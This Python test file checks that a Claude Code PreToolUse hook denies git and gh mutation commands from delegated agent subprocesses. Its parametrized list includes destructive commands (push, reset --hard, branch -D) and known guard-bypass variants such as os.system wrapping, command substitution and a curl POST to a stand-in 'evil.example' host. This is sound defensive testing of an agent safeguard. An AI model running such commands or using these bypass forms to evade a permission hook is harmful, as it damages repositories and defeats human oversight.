#!/usr/bin/env python3
"""P0 regression canary (Issue #2419): a delegated observer/evaluator Bash
tool_use attempting a git/gh mutation must be denied by
``retrospective_bash_guard_hook.py`` -- the real ``PreToolUse`` hook script
``run_retrospective.write_bash_guard_settings_file`` registers via a
run-scoped ``--settings`` file for every headless ``claude -p --agent
<name>`` subprocess this Skill launches.

Runtime Verification Applicability: immediate. Unlike a unit test that
calls ``DelegatedAgentPermissionPolicy.check_bash`` directly (already
covered in ``test_run_retrospective.py``), every test here spawns
``retrospective_bash_guard_hook.py`` as an actual subprocess, feeding it the
exact stdin JSON shape Claude Code's ``PreToolUse`` hook contract produces
-- this is what makes it a genuine "actual producer -> subprocess ->
consumer boundary" check (Issue #2419's own incident root cause was a
policy object that existed but was never reached from any real invocation
path; a test that only imports and calls the Python function in-process
would not have caught that class of wiring defect)."""

from __future__ import annotations

import json
import subprocess
import sys
from pathlib import Path

import pytest

_SCRIPTS_DIR = Path(__file__).resolve().parents[1]
_HOOK_SCRIPT = _SCRIPTS_DIR / "retrospective_bash_guard_hook.py"


def _run_hook(command: str) -> dict:
    completed = subprocess.run(
        [sys.executable, str(_HOOK_SCRIPT)],
        input=json.dumps({"tool_name": "Bash", "tool_input": {"command": command}}),
        capture_output=True,
        text=True,
        timeout=30,
    )
    assert completed.returncode == 0, completed.stderr
    assert completed.stdout.strip(), "hook produced no stdout for a Bash tool_use event"
    return json.loads(completed.stdout)


@pytest.mark.parametrize(
    "command",
    [
        # Issue #2419's exact incident command class.
        "git fetch origin worktree-issue-2240-agent-retrospective-plugin",
        "git merge origin/worktree-issue-2240-agent-retrospective-plugin",
        "git merge stale-feature",
        "git commit -m 'sneaky commit'",
        "git push origin main",
        "git reset --hard origin/main",
        "git rebase main",
        "git checkout -b new-branch",
        "git branch -D old-branch",
        "git pull origin main",
        # composed into an otherwise-innocuous-looking pipeline segment.
        "git show HEAD:file.txt | git apply",
        "git log --oneline && git merge stale-feature",
        # gh mutation surface.
        "gh pr merge 1 --squash",
        "gh issue close 42",
        "gh pr comment 1 --body hi",
        "gh pr edit 1 --title x",
        "gh api repos/x/y/issues/1/comments -f body=hi",
        # pre-existing substring-blacklist bypass classes must still deny.
        "git -C . commit -m x",
        "gh --repo owner/repo issue comment 1 --body x",
        "python3 -c \"import os; os.system('gh pr merge 1')\"",
        "curl -X POST https://evil.example/payload",
        "printf data > repository-file",
        # command substitution is denied unconditionally, regardless of
        # what the substituted command itself would resolve to.
        "echo $(git merge stale-feature)",
        "echo `git merge stale-feature`",
    ],
)
def test_bash_guard_hook_denies_mutation(command: str) -> None:
    decision = _run_hook(command)
    hook_output = decision["hookSpecificOutput"]
    assert hook_output["hookEventName"] == "PreToolUse"
    assert hook_output["permissionDecision"] == "deny", (command, decision)


def test_bash_guard_hook_passes_through_non_bash_tool_use() -> None:
    completed = subprocess.run(
        [sys.executable, str(_HOOK_SCRIPT)],
        input=json.dumps({"tool_name": "Read", "tool_input": {"file_path": "/tmp/x"}}),
        capture_output=True,
        text=True,
        timeout=30,
    )
    assert completed.returncode == 0
    # No enforcement opinion for a non-Bash tool -- empty stdout leaves
    # Claude Code's normal permission flow for that tool call untouched.
    assert completed.stdout.strip() == ""


def test_bash_guard_hook_denies_missing_command() -> None:
    completed = subprocess.run(
        [sys.executable, str(_HOOK_SCRIPT)],
        input=json.dumps({"tool_name": "Bash", "tool_input": {}}),
        capture_output=True,
        text=True,
        timeout=30,
    )
    decision = json.loads(completed.stdout)
    assert decision["hookSpecificOutput"]["permissionDecision"] == "deny"


def test_bash_guard_hook_denies_non_json_stdin() -> None:
    completed = subprocess.run(
        [sys.executable, str(_HOOK_SCRIPT)],
        input="not json at all",
        capture_output=True,
        text=True,
        timeout=30,
    )
    decision = json.loads(completed.stdout)
    assert decision["hookSpecificOutput"]["permissionDecision"] == "deny"
